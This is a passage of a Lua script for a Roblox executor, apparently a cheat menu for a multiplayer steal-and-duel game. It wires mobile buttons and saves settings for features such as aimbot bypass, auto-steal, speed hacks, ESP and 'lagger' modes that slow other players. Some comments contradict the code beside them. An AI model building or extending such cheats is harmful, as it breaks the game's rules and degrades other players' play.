        btnFrame:SetAttribute("BtnKey", key)
        btnFrame.Parent = mobGui
        local cornerR = (M.circleButtonsEnabled and UDim.new(1, 0)) or UDim.new(0, 12)
        Instance.new("UICorner", btnFrame).CornerRadius = cornerR
        local bStroke = Instance.new("UIStroke")
        bStroke.Name = "BtnStroke"
        bStroke.Color = C.stackBrd
        bStroke.Thickness = 1
        bStroke.Parent = btnFrame
        -- White dots on mobile buttons
        pcall(function()
            M.placeDotsOn(btnFrame, 18, M.circleButtonsEnabled and 999 or 12, 100 + i)
        end)

        -- no button background images — solid black
        btnFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
        btnFrame.BackgroundTransparency = 0
        local oldBg = btnFrame:FindFirstChild("BtnBgImage")
        if oldBg then pcall(function() oldBg:Destroy() end) end


        M.mobBtnFrames[key] = btnFrame

        local btnState = false
        local function setOn(on)
            btnState = on == true
            btnFrame:SetAttribute("MB_On", btnState)
            TweenService:Create(btnFrame, TweenInfo.new(0.12), {
                BackgroundColor3 = btnState and C.stackActBg or C.stackBg,
                TextColor3 = btnState and C.stackActTxt or C.stackTxt,
            }):Play()
            TweenService:Create(bStroke, TweenInfo.new(0.12), {
                Color = btnState and C.stackActBrd or C.stackBrd,
                Thickness = btnState and 1.5 or 1,
            }):Play()
        end
        M.mobBtnRefs[key] = setOn

        local function applyPressVisual(pressed)
            if pressed then
                TweenService:Create(btnFrame, TweenInfo.new(0.08), {
                    BackgroundColor3 = C.stackPressBg,
                    TextColor3 = C.stackPressTxt,
                }):Play()
                TweenService:Create(bStroke, TweenInfo.new(0.08), {
                    Color = C.stackActBrd,
                    Thickness = 1.5,
                }):Play()
            else
                setOn(btnState)
            end
        end

        local function fireAction()
            if key == "tpDown" then
                -- instant, no cooldown
                pcall(function()
                    if M.runTPFloor then M.runTPFloor()
                    elseif M.doAutoTPDown then M.doAutoTPDown(true) end
                end)
                setOn(true)
                task.defer(function() setOn(false) end)
                return
            end
            if key == "drop" then
                task.spawn(function()
                    setOn(true)
                    if M.executeDropWithToggle then
                        M.executeDropWithToggle(function(v) setOn(v) end)
                    elseif M.runDrop then
                        pcall(M.runDrop)
                    elseif M.runDropBrainrot then
                        pcall(M.runDropBrainrot)
                    end
                    local t0 = tick()
                    while M.dropActive and (tick() - t0) < 1.5 do task.wait() end
                    setOn(false)
                end)
                return
            end
            if key == "reset" then
                task.spawn(function()
                    setOn(true)
                    if M.cursedInstaReset then pcall(M.cursedInstaReset) end
                    task.wait(0.15)
                    setOn(false)
                end)
                return
            end
            if key == "bypass" then
                M.toggleBypassAimbot()
                setOn(M.bypassAimbotEnabled)
                if M.setBypassVisual then pcall(M.setBypassVisual, M.bypassAimbotEnabled) end
                pcall(saveCherryConfig)
                return
            end
            if key == "autoLeft" then
                if M.autoRightEnabled then
                    M.autoRightEnabled = false
                    if M.stopAutoRight then M.stopAutoRight() end
                    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(false) end
                end
                M.autoLeftEnabled = not M.autoLeftEnabled
                if M.autoLeftEnabled then
                    if M.startAutoLeft then M.startAutoLeft() end
                else
                    if M.stopAutoLeft then M.stopAutoLeft() end
                end
                setOn(M.autoLeftEnabled)
                pcall(saveCherryConfig)
                return
            end
            if key == "autoRight" then
                if M.autoLeftEnabled then
                    M.autoLeftEnabled = false
                    if M.stopAutoLeft then M.stopAutoLeft() end
                    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(false) end
                end
                M.autoRightEnabled = not M.autoRightEnabled
                if M.autoRightEnabled then
                    if M.startAutoRight then M.startAutoRight() end
                else
                    if M.stopAutoRight then M.stopAutoRight() end
                end
                setOn(M.autoRightEnabled)
                pcall(saveCherryConfig)
                return
            end
            if key == "autoBat" then
                if not M.autoBatEnabled then
                    if M.queueAutoBatStart then M.queueAutoBatStart() else if M.startBatAimbot then M.startBatAimbot() end end
                else
                    if M.stopBatAimbot then M.stopBatAimbot() end
                end
                setOn(M.autoBatEnabled)
                if M.autoBatSetVisual then pcall(M.autoBatSetVisual, M.autoBatEnabled) end
                pcall(saveCherryConfig)
                return
            end
            if key == "lagger" then
                M.laggerCarryActive = false
                if M.toggleLaggerMode then M.toggleLaggerMode() end
                setOn(M.laggerModeEnabled)
                if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
                if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
                pcall(saveCherryConfig)
                return
            end
            if key == "laggerCarry" then
                if M.toggleLaggerCarryMode then
                    M.toggleLaggerCarryMode()
                else
                    -- fallback: toggle flag + reuse toggleCarry if needed
                    M.laggerCarryActive = not M.laggerCarryActive
                    if M.laggerCarryActive and M.laggerModeEnabled then
                        M.laggerModeEnabled = false
                    end
                end
                setOn(M.laggerCarryActive)
                if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
                pcall(saveCherryConfig)
                return
            end
            if key == "carrySpeed" then
                if M.toggleCarryMode then M.toggleCarryMode() end
                setOn(M.carrySpeedActive)
                if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
                pcall(saveCherryConfig)
                return
            end
        end

        -- Green Duels drag + tap logic
        local dragStartPos, startPos = nil, nil
        local isDragging, movedEnough, wasPressed = false, false, false
        local pressTime = 0

        btnFrame.InputBegan:Connect(function(input)
            if input.UserInputType ~= Enum.UserInputType.MouseButton1 and input.UserInputType ~= Enum.UserInputType.Touch then return end
            wasPressed = true
            pressTime = tick()
            dragStartPos = input.Position
            startPos = btnFrame.Position
            isDragging = true
            movedEnough = false
            applyPressVisual(true)
        end)
        btnFrame.InputChanged:Connect(function(input)
            if not isDragging or M.mobileButtonsLocked then return end
            if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
                local delta = input.Position - dragStartPos
                if delta.Magnitude > 8 then movedEnough = true end
                if movedEnough then
                    btnFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
                    applyPressVisual(false)
                end
            end
        end)
        btnFrame.InputEnded:Connect(function(input)
            if not isDragging then return end
            isDragging = false
            applyPressVisual(false)
            if movedEnough then
                if M.saveBtnPositions then pcall(M.saveBtnPositions) end
                pcall(function() if saveCherryConfig then saveCherryConfig() end end)
            elseif wasPressed and not movedEnough then
                -- no time-window cooldown — any short tap fires
                fireAction()
            end
            wasPressed = false
        end)
        btnFrame.MouseButton1Click:Connect(function()
            -- backup click path (no time-window / no cooldown)
            if movedEnough then return end
            if wasPressed then return end -- InputEnded already fired
            fireAction()
        end)
    end

    if M.mobBtnRefs.autoLeft then M.mobBtnRefs.autoLeft(M.autoLeftEnabled) end
    if M.mobBtnRefs.autoRight then M.mobBtnRefs.autoRight(M.autoRightEnabled) end
    if M.mobBtnRefs.autoBat then M.mobBtnRefs.autoBat(M.autoBatEnabled) end
    if M.mobBtnRefs.lagger then M.mobBtnRefs.lagger(M.laggerModeEnabled) end
    if M.mobBtnRefs.laggerCarry then M.mobBtnRefs.laggerCarry(M.laggerCarryActive) end
    if M.mobBtnRefs.carrySpeed then M.mobBtnRefs.carrySpeed(M.carrySpeedActive) end
    if M.mobBtnRefs.bypass then M.mobBtnRefs.bypass(M.bypassAimbotEnabled) end
    pcall(function() M.refreshOriginalModeMobileButtons() end)
end



-- ============================================================
-- CONFIG SAVE/LOAD
-- ============================================================
local CHERRY_CONFIG_NAME = "CherryConfig.json"
local CherryConfig = { Theme="White" }
local CHERRY_THEMES = {
    White  = { Accent=Color3.fromRGB(255, 255, 255), AccentDim=Color3.fromRGB(160, 160, 160), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(255, 255, 255), Overlay=Color3.fromRGB(8,8,8) },
    Purple = { Accent=Color3.fromRGB(207, 159, 255), AccentDim=Color3.fromRGB(140, 90, 190), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(207, 159, 255), Overlay=Color3.fromRGB(8,8,8) },
    Blue   = { Accent=Color3.fromRGB(58, 128, 245), AccentDim=Color3.fromRGB(40, 85, 170), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(58, 128, 245), Overlay=Color3.fromRGB(8,8,8) },
    Red    = { Accent=Color3.fromRGB(232, 52, 68), AccentDim=Color3.fromRGB(160, 30, 40), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(232, 52, 68), Overlay=Color3.fromRGB(8,8,8) },
    Pink   = { Accent=Color3.fromRGB(255, 105, 180), AccentDim=Color3.fromRGB(180, 60, 120), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(255, 105, 180), Overlay=Color3.fromRGB(8,8,8) },
    Yellow = { Accent=Color3.fromRGB(255, 214, 0), AccentDim=Color3.fromRGB(180, 150, 0), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(255, 214, 0), Overlay=Color3.fromRGB(8,8,8) },
    Grey   = { Accent=Color3.fromRGB(90, 90, 90), AccentDim=Color3.fromRGB(60, 60, 60), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(90, 90, 90), Overlay=Color3.fromRGB(8,8,8) },
    Forest = { Accent=Color3.fromRGB(46, 139, 87), AccentDim=Color3.fromRGB(30, 90, 55), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(46, 139, 87), Overlay=Color3.fromRGB(8,8,8) },
    -- old names
    ["Black White"] = { Accent=Color3.fromRGB(255, 255, 255), AccentDim=Color3.fromRGB(160, 160, 160), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(255, 255, 255), Overlay=Color3.fromRGB(8,8,8) },
    ["Light Purple"] = { Accent=Color3.fromRGB(207, 159, 255), AccentDim=Color3.fromRGB(140, 90, 190), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(207, 159, 255), Overlay=Color3.fromRGB(8,8,8) },
    ["Purple Vynx"] = { Accent=Color3.fromRGB(207, 159, 255), AccentDim=Color3.fromRGB(140, 90, 190), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(207, 159, 255), Overlay=Color3.fromRGB(8,8,8) },
    ["Red Vynx"] = { Accent=Color3.fromRGB(232, 52, 68), AccentDim=Color3.fromRGB(160, 30, 40), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(232, 52, 68), Overlay=Color3.fromRGB(8,8,8) },
    Default = { Accent=Color3.fromRGB(255, 255, 255), AccentDim=Color3.fromRGB(160, 160, 160), Bg=Color3.fromRGB(0,0,0), Row=Color3.fromRGB(12,12,14), Shell=Color3.fromRGB(18,18,20), ShellTrans=0.12, Stroke=Color3.fromRGB(255, 255, 255), Overlay=Color3.fromRGB(8,8,8) },
}
if M._savedTheme and CHERRY_THEMES[M._savedTheme] then
    CherryConfig.Theme = M._savedTheme
end
M.colorScheme = CherryConfig.Theme
M.bgImageColor = Color3.fromRGB(255, 255, 255) -- no color tint on background image
M.customBgId = 90631990302263  -- default menu background
M.customBgOpacity = 0.35
M.mobBtnBgId = 0
M.BG_IMAGE_IDS = {
    90631990302263,
    109619268613730,
    88369503310562,
}
M.MOB_BTN_IMAGE_IDS = {
    123407376197646,
    90758919051283,
    140420978895712,
}


local function loadCherryConfig()
M._mobLayoutVer = 8
M._forceDefaultMobPos = true
M.uiScale = 0.48
M.stealBarSize = 300
    if type(readfile)~="function" or type(isfile)~="function" then return end
    local ok,d = pcall(function()
        if not isfile(CHERRY_CONFIG_NAME) then return nil end
        return HS:JSONDecode(readfile(CHERRY_CONFIG_NAME))
    end)
    if ok and type(d)=="table" then
        local themeName = nil
        if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then themeName = d.Theme end
        if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then themeName = d.colorScheme end
        if themeName then
            if themeName == "Purple Xim" or themeName == "Purple Vynx" or themeName == "Light Purple" then themeName = "Purple" end
            if themeName == "Black White" or themeName == "Default" or themeName == "WHITE" then themeName = "White" end
            if themeName == "Red Vynx" then themeName = "Red" end
            if not CHERRY_THEMES[themeName] then themeName = "White" end
            CherryConfig.Theme = themeName
            M.colorScheme = themeName
            M._savedTheme = themeName
        end
        -- menu position is NOT restored on rejoin (always default)
        M.menuPosX = nil
        M.menuPosY = nil
        if type(d.normalSpeed)=="number" then M.NS=d.normalSpeed end
        if type(d.carrySpeed)=="number" then M.CS=d.carrySpeed end
        if type(d.laggerSpeed)=="number" then M.LAGGER_SPEED=d.laggerSpeed end
        if type(d.laggerCarrySpeed)=="number" then M.LAGGER_CARRY_SPEED=d.laggerCarrySpeed end
        if type(d.bypassSpeed)=="number" then M.BYPASS_SPEED=d.bypassSpeed end
        if type(d.bypassCarrySpeed)=="number" then M.BYPASS_CARRY_SPEED=d.bypassCarrySpeed end
        if type(d.speedMethod)=="string" then
            for _,sm in ipairs(M.speedMethodList) do if sm==d.speedMethod then M.speedMethod=sm; break end end
        if type(d.speedUIMode)=="string" and (d.speedUIMode=="Customizer" or d.speedUIMode=="Original") then M.speedUIMode=d.speedUIMode end
        if d.speedBoosterEnabled~=nil then M.speedBoosterEnabled=d.speedBoosterEnabled==true end
        if type(d.speedBoosterPath)=="string" then M.speedBoosterPath=d.speedBoosterPath end
        if d.speedBoosterPanelOpen~=nil then M.speedBoosterPanelOpen=d.speedBoosterPanelOpen==true end
        if d.nukeOptEnabled~=nil then M.nukeOptEnabled=d.nukeOptEnabled==true end
        end
        if type(d.grabRadius)=="number" then M.Steal.StealRadius=d.grabRadius end
        if type(d.stealDuration)=="number" then M.Steal.StealDuration=d.stealDuration end
        M.Steal.StopTime = (tonumber(M.Steal.StealDuration) or 1.3) * 0.73 -- force ~73%
        M.autoGrabPausePct = 0.73
        if type(d.stealMode)=="string" then
            if d.stealMode == "Semi" or d.stealMode == "V2" then
                M.stealMode=d.stealMode
            end
        end
        if type(d.autoTPHeight)=="number" then M.autoTPHeight=d.autoTPHeight end
        if type(d.fovValue)=="number" then M.fovValue=d.fovValue end
        M.uiScale = 0.48 -- smaller menu
        if type(d.infJumpMode)=="string" then M.infJumpMode=d.infJumpMode end
        if type(d.mobileButtonsSize)=="number" then M.mobileButtonsSize=d.mobileButtonsSize end
        if type(d.skyTheme)=="string" then M.currentSkyTheme=d.skyTheme end
        M.cleanSkyEnabled = true
        -- steal bar forced small — ignore saved size
        M.stealBarSize = 300
        if d.carrySpeedActive~=nil then M.carrySpeedActive=d.carrySpeedActive end
        if d.laggerModeEnabled~=nil then M.laggerModeEnabled=d.laggerModeEnabled end
        if d.speedCustomizerEnabled~=nil then M.speedCustomizerEnabled=d.speedCustomizerEnabled==true end
        if d.autoSwing~=nil then M.autoSwingEnabled=d.autoSwing==true end
        M.introSoundEnabled = false
        if d.introSongChoice then M.introSongChoice=d.introSongChoice end
        if d.introGUIEnabled~=nil then M.introGUIEnabled=d.introGUIEnabled==true end
        if d.ragdollGui~=nil then M.ragdollGuiEnabled=d.ragdollGui==true end
        if d.circleButtonsEnabled~=nil then M.circleButtonsEnabled=d.circleButtonsEnabled==true end
        if d.perButtonDrag~=nil then M.perButtonDragEnabled=d.perButtonDrag==true end
        if d.mobileButtonsEnabled~=nil then M.mobileButtonsEnabled=d.mobileButtonsEnabled end
        M.medusaResetEnabled = false -- feature removed
        if d.autoMoveSwing~=nil then M.autoMoveSwingEnabled=d.autoMoveSwing==true end
        if d.autoSwitchSpeed~=nil then M.autoSwitchSpeedEnabled=d.autoSwitchSpeed==true end
        if d.autoCarryEnemyBase~=nil then M.autoCarryEnemyBaseEnabled=d.autoCarryEnemyBase==true end
        if type(d.autoCarryEnemyBaseRange)=="number" then M.autoCarryEnemyBaseRange=d.autoCarryEnemyBaseRange end
        if d.pingPanelOpen~=nil then M.pingPanelOpen=d.pingPanelOpen==true end
        if type(d.killLaggerNivel)=="string" then M.killLaggerNivel=d.killLaggerNivel end
        if d.killLaggerOpen~=nil then M.killLaggerOpen=d.killLaggerOpen==true end
        if type(d.killLaggerKey)=="string" then M.killLaggerKey=d.killLaggerKey end
        if type(d.killLaggerLowKey)=="string" then M.killLaggerLowKey=d.killLaggerLowKey end
        if d.killLaggerLocked~=nil then M.killLaggerLocked=d.killLaggerLocked==true end
        if type(d.pingPower)=="number" then M.pingPower=d.pingPower end
        if type(d.pingInterval)=="number" then M.pingInterval=d.pingInterval end
        if type(d.pingKeybindKb)=="string" then M.pingKeybindKb=d.pingKeybindKb end
        if type(d.pingKeybindGp)=="string" then M.pingKeybindGp=d.pingKeybindGp end
        if d.pingAutoBrainrot~=nil then M.pingAutoBrainrot=d.pingAutoBrainrot==true end
        if type(d.pingBackground)=="number" then M.pingBackground=d.pingBackground end
        if d.pingLocked~=nil then M.pingLocked=d.pingLocked==true end
        if d.pingMinimized~=nil then M.pingMinimized=d.pingMinimized==true end
        if type(d.pingPanelPos)=="table" then M.pingPanelPos=d.pingPanelPos end
        if type(d.panelBgImageId)=="number" then M.panelBgImageId=d.panelBgImageId end
        if type(d.panelBgImageId)=="string" and tonumber(d.panelBgImageId) then M.panelBgImageId=tonumber(d.panelBgImageId) end

        if d.aadEnabled~=nil then M.aadEnabled=d.aadEnabled==true end
        if type(d.aadVersion)=="string" then M.aadVersion=(d.aadVersion=="V1") and "V1" or "V2" end
        if type(d.aadKeybind)=="string" then M.aadKeybind=d.aadKeybind end
        if d.aadPanelOpen~=nil then M.aadPanelOpen=d.aadPanelOpen==true end
        if d.aadLocked~=nil then M.aadLocked=d.aadLocked==true end
        if type(d.aadPanelPos)=="table" then M.aadPanelPos=d.aadPanelPos end
        if d.bypassPanelOpen~=nil then M.bypassPanelOpen=d.bypassPanelOpen==true end
        if d.bypassAutoBrainrot~=nil then M.bypassAutoBrainrot=d.bypassAutoBrainrot==true end
        if d.bypassBillboardOn~=nil then M.bypassBillboardOn=d.bypassBillboardOn~=false end
        if type(d.bypassKeybind)=="string" then M.bypassKeybind=d.bypassKeybind end
        if type(d.bypassPower)=="number" then M.bypassPower=d.bypassPower end
        if d.mobileButtonsLocked~=nil then M.mobileButtonsLocked=d.mobileButtonsLocked==true end
        if type(d.mobLayoutVer)=="number" then M._mobLayoutVer=d.mobLayoutVer end
        if (M._mobLayoutVer or 0) < 7 then M._mobLayoutVer = 7; M._forceDefaultMobPos = true end
        M.autoTurnOffSpeedEnabled=false
        M.autoSwitchLaggerSpeedEnabled=false
        if type(d.customFont)=="string" then M.customFontSelected=(d.customFont=="Bangers" and "None" or d.customFont) end
        if d.showPlayerSpeeds~=nil then M.showPlayerSpeeds=d.showPlayerSpeeds==true end
        if d.removeAcc~=nil then M.removeAccEnabled=d.removeAcc end
        if d.playerESPEnabled~=nil then M.playerESPEnabled=d.playerESPEnabled end
        if d.antiRagdoll~=nil then M.antiRagdollEnabled=d.antiRagdoll end
        if d.hardHitEnabled~=nil then M.hardHitEnabled=d.hardHitEnabled==true end
        if type(d.hardHitRadius)=="number" then M.hardHitRadius=d.hardHitRadius end
        if type(d.antiRagdollMode)=="string" and (d.antiRagdollMode=="Splatter" or d.antiRagdollMode=="No Splatter") then M.antiRagdollMode=d.antiRagdollMode end
        if d.autoStealEnabled~=nil then M.Steal.AutoStealEnabled=d.autoStealEnabled end
        if d.autoRadiusEnabled~=nil then M.autoRadiusEnabled=d.autoRadiusEnabled==true end

        if d.infiniteJump~=nil then M.infJumpEnabled=d.infiniteJump end
        if d.medusaCounter~=nil then M.medusaCounterEnabled=d.medusaCounter end
        if d.batCounter~=nil then M.batCounterEnabled=d.batCounter end
        -- Unwalk only if explicitly saved true; otherwise always OFF (original walk)
        M.unwalkEnabled = (d.unwalkEnabled == true)
        if d.antiDieEnabled ~= nil then M.antiDieEnabled = d.antiDieEnabled == true end
        M.korbloxEnabled = false
        M.antiLagEnabled = true -- Nuke optimizer ALWAYS ON (no disable)
        M.antiSummerBaseEnabled = false -- removed
        M.uiLocked = false
        if d.stretchRez~=nil then M.stretchRezEnabled=d.stretchRez end
        if d.potatoGraphics~=nil then M.potatoGraphicsEnabled=d.potatoGraphics==true end
        if d.autoTPEnabled~=nil then M.autoTPEnabled=d.autoTPEnabled end
        if d.mirrorTPDownEnabled~=nil then M.mirrorTPDownEnabled=d.mirrorTPDownEnabled==true end
        if d.perfectHitEnabled~=nil then M.perfectHitEnabled=d.perfectHitEnabled~=false; M.tpBatSureHitEnabled=M.perfectHitEnabled end
        M.antiKickEnabled = false -- removed
        if d.fpsBoost ~= nil then M.fpsBoostEnabled = d.fpsBoost == true end
        if d.safeMode~=nil then M.safeModeEnabled=d.safeMode end
        if d.vyncSkin~=nil then M.vyncSkinEnabled=d.vyncSkin==true end
        do
            local bid = tonumber(d.customBgId) or 0
            local okB = false
            if bid > 0 and M.BG_IMAGE_IDS then
                for _, v in ipairs(M.BG_IMAGE_IDS) do
                    if tonumber(v) == bid then okB = true break end
                end
            end
            M.customBgId = okB and bid or 123407376197646
        end
        if type(d.customBgOpacity)=="number" then M.customBgOpacity=math.clamp(d.customBgOpacity,0,1) end
        do
            local mid = tonumber(d.mobBtnBgId) or 0
            local okM = false
            if mid > 0 and M.MOB_BTN_IMAGE_IDS then
                for _, v in ipairs(M.MOB_BTN_IMAGE_IDS) do
                    if tonumber(v) == mid then okM = true break end
                end
            end
            M.mobBtnBgId = okM and mid or 0
        end
        if type(d.btnPos)=="table" then M._btnPosCache=d.btnPos end
        if type(d.stealBarPos)=="table" and type(d.stealBarPos.ox)=="number" then
            M.stealBarPos = {
                sx = tonumber(d.stealBarPos.sx) or 0.5,
                ox = tonumber(d.stealBarPos.ox) or 0,
                sy = tonumber(d.stealBarPos.sy) or 1,
                oy = tonumber(d.stealBarPos.oy) or -60,
            }
        end
        if d.autoBat~=nil then M.autoBatEnabled=d.autoBat end
        if d.semiHoldMin then M.Semi.holdMin=d.semiHoldMin end
        if d.semiHoldMax then M.Semi.holdMax=d.semiHoldMax end
        if d.semiEntryDelay then M.Semi.entryDelay=d.semiEntryDelay end
        if d.semiPrimeRange then M.Semi.primeRange=d.semiPrimeRange end
        if type(d.semiRadius)=="number" then M.Semi.radius=math.min(d.semiRadius, 10) end
        if d.lineESPEnabled~=nil then M.lineESPEnabled=d.lineESPEnabled end
        if d.highlightESPEnabled~=nil then M.highlightESPEnabled=d.highlightESPEnabled==true end
        if d.menuOpen~=nil then M.menuOpen=d.menuOpen~=false end
        -- theme already applied above; keep M._savedTheme in sync
        if type(d.Theme)=="string" and CHERRY_THEMES[d.Theme] then M._savedTheme=d.Theme; M.colorScheme=d.Theme end
        if type(d.colorScheme)=="string" and CHERRY_THEMES[d.colorScheme] then M._savedTheme=d.colorScheme; M.colorScheme=d.colorScheme end
        if d.speedESPEnabled~=nil then M.speedESPEnabled=d.speedESPEnabled end
        M.autoResetOnDeath = false -- feature removed
        if type(d.animPack)=="string" then M.animPack=d.animPack end
        if type(M.animPack) ~= "string" or not M.PACKS[M.animPack] then M.animPack = "Bubbly" end
        -- Headless + VYNX Black Skin always forced ON for all executors
        M.headlessEnabled = false
        M.korbloxEnabled = false
        M.vynxBlackSkinEnabled = false
        if d.bypassAimbotEnabled~=nil then M.bypassAimbotEnabled=d.bypassAimbotEnabled end
        if type(d.tpBatHitMode)=="string" then
            local m = tostring(d.tpBatHitMode):lower()
            if m == "normal" or m == "normal hit" then
                M.tpBatHitMode = "Normal"
            else
                M.tpBatHitMode = "Sure"
            end
        end
        -- Animation pack / Unwalk from config (mutually exclusive; both off = normal anims)
        local ALLOWED = { Vampire = true, ["Amazon Unboxed"] = true, Bubbly = true, Tryhard = true }
        M.animPackEnabled = (d.animPackEnabled == true)
        if type(d.animPack) == "string" and ALLOWED[d.animPack] then
            M.animPack = d.animPack
        end
        if M.animPackEnabled then
            if type(M.animPack) ~= "string" or not ALLOWED[M.animPack] then
                M.animPack = "Vampire"
            end
            M.unwalkEnabled = false -- pack wins over unwalk
        else
            M.animPack = nil
            -- unwalk already loaded above from d.unwalkEnabled
        end
        -- always strip removed features
        M.antiKickEnabled = false
        M.antiSummerBaseEnabled = false
        M.customFontSelected = "None"
        local function lk(e,d2)
            if type(d2)~="table" then return end
            if d2.kb and Enum.KeyCode[d2.kb] then e.kb=Enum.KeyCode[d2.kb] else e.kb=nil end
            if d2.gp and Enum.KeyCode[d2.gp] then e.gp=Enum.KeyCode[d2.gp] else e.gp=nil end
        end
        if d.dropBrainrotKey then lk(M.KB.DropBrainrot,d.dropBrainrotKey) end
        if d.autoLeftKey then lk(M.KB.AutoLeft,d.autoLeftKey) end
        if d.autoRightKey then lk(M.KB.AutoRight,d.autoRightKey) end
        if d.autoBatKey then lk(M.KB.AutoBat,d.autoBatKey) end
        if d.laggerToggleKey then lk(M.KB.LaggerToggle,d.laggerToggleKey) end
        if d.tpFloorKey then lk(M.KB.TPFloor,d.tpFloorKey) end
        if d.instaResetKey then lk(M.KB.InstaReset,d.instaResetKey) end
        if d.guiHideKey then lk(M.KB.GuiHide,d.guiHideKey) end
        if d.speedToggleKey then lk(M.KB.SpeedToggle,d.speedToggleKey) end
        if d.bypassAimbotKey then lk(M.KB.BypassAimbot,d.bypassAimbotKey) end
        if d.pingLaggerKey then lk(M.KB.PingLagger,d.pingLaggerKey) end
        if M.KB.PingLagger and M.KB.PingLagger.kb then M.pingKeybindKb = M.KB.PingLagger.kb.Name end
        if M.KB.PingLagger and M.KB.PingLagger.gp then M.pingKeybindGp = M.KB.PingLagger.gp.Name end
        -- Dedupe shared keys after load (each keycode only on one bind)
        do
            local seenKb, seenGp = {}, {}
            local order = {
                M.KB.BypassAimbot, M.KB.AutoBat, M.KB.DropBrainrot, M.KB.SpeedToggle,
                M.KB.LaggerToggle, M.KB.AutoLeft, M.KB.AutoRight, M.KB.TPFloor,
                M.KB.PingLagger, M.KB.GuiHide, M.KB.InstaReset,
            }
            for _, e in ipairs(order) do
                if type(e) == "table" then
                    if e.kb then
                        if seenKb[e.kb] then e.kb = nil else seenKb[e.kb] = true end
                    end
                    if e.gp then
                        if seenGp[e.gp] then e.gp = nil else seenGp[e.gp] = true end
                    end
                end
            end
        end
    end
end

local function saveCherryConfig()
    if type(writefile)~="function" then return end
    local function ks(e)
        if type(e) ~= "table" then return {kb=nil,gp=nil} end
        return {
            kb = (e.kb and e.kb.Name) or nil,
            gp = (e.gp and e.gp.Name) or nil,
        }
    end
    local cfg = {
        Theme=CherryConfig.Theme, colorScheme=M.colorScheme or CherryConfig.Theme, menuOpen=M.menuOpen~=false,
        -- menuPos intentionally omitted — never persist menu position across rejoins
        normalSpeed=M.NS, carrySpeed=M.CS, laggerSpeed=M.LAGGER_SPEED,
        laggerCarrySpeed=M.LAGGER_CARRY_SPEED, bypassSpeed=M.BYPASS_SPEED, bypassCarrySpeed=M.BYPASS_CARRY_SPEED, speedMethod=M.speedMethod, speedUIMode=M.speedUIMode or "Original", speedBoosterEnabled=M.speedBoosterEnabled~=false, speedBoosterPath=M.speedBoosterPath or "Normal", speedBoosterPanelOpen=M.speedBoosterPanelOpen==true, nukeOptEnabled=M.nukeOptEnabled==true, grabRadius=M.Steal.StealRadius,
        stealDuration=M.Steal.StealDuration, stealStopTime=M.Steal.StopTime, stealMode=M.stealMode,
        autoTPHeight=M.autoTPHeight, fovValue=M.fovValue, uiScale=M.uiScale,
        infJumpMode=M.infJumpMode,
        mobileButtonsSize=M.mobileButtonsSize, skyTheme=M.currentSkyTheme, cleanSkyEnabled=M.cleanSkyEnabled==true,
        customBgId=tonumber(M.customBgId) or 0, customBgOpacity=tonumber(M.customBgOpacity) or 0.35,
        mobBtnBgId=tonumber(M.mobBtnBgId) or 0, btnPos=M._btnPosCache,
        stealBarSize=M.stealBarSize,
        stealBarPos=M.stealBarPos,
        carrySpeedActive=M.carrySpeedActive, laggerModeEnabled=M.laggerModeEnabled, speedCustomizerEnabled=M.speedCustomizerEnabled==true,
        autoSwing=M.autoSwingEnabled, introSoundEnabled=M.introSoundEnabled,
        introSongChoice=M.introSongChoice,
        introGUIEnabled=M.introGUIEnabled,
        ragdollGui=M.ragdollGuiEnabled, circleButtonsEnabled=M.circleButtonsEnabled,
        perButtonDrag=M.perButtonDragEnabled, mobileButtonsEnabled=M.mobileButtonsEnabled,
        medusaReset=M.medusaResetEnabled, autoMoveSwing=M.autoMoveSwingEnabled,
